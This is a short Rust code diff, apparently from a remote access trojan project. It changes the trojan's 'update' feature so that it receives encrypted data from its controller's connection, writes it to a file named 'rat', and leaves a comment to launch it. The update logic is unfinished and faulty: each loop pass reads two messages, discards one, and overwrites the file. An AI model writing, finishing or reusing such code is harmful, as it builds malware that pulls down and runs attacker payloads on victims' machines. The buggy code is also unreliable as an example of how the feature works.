@@ -1,4 +1,7 @@
-use futures_util::StreamExt;
+use tokio::{
+    fs::{self, OpenOptions},
+    io::AsyncWriteExt,
+};
 
 use crate::connector::{hybrid_decryption::HybridDecryption, Connector};
 
@@ -12,21 +15,15 @@ impl Feature for Update {
         "update".to_string()
     }
     async fn run(&self, connector: &mut Connector) -> Result {
-        let mut hybrid_decryption_arguments: [Vec<u8>; 3] = [Vec::new(), Vec::new(), Vec::new()];
-        for index in 0..3 {
-            if let Some(message) = connector.read.as_mut().unwrap().next().await {
-                //cant put hex decode in the decrypt fn cuz it cant accept
-                hybrid_decryption_arguments[index] =
-                    hex::decode(message.unwrap().to_string()).unwrap();
-            }
+        while connector.accept_encrypted_message().await != "stop_file_transfer" {
+            fs::write("rat", connector.accept_encrypted_message().await.as_bytes())
+                .await
+                .unwrap();
         }
-        let hybrid_decryption = HybridDecryption::new(
-            hybrid_decryption_arguments[0].clone(),
-            hybrid_decryption_arguments[1].clone(),
-            hybrid_decryption_arguments[2].clone(),
-        );
-        let decrypted_message = hybrid_decryption.decrypt(connector.private_key.clone());
-        Result::FAILED
+        //launch it
+
+        //check if its running somehow idono
+        Result::SUCCESFUL
     }
 }
 impl Update {
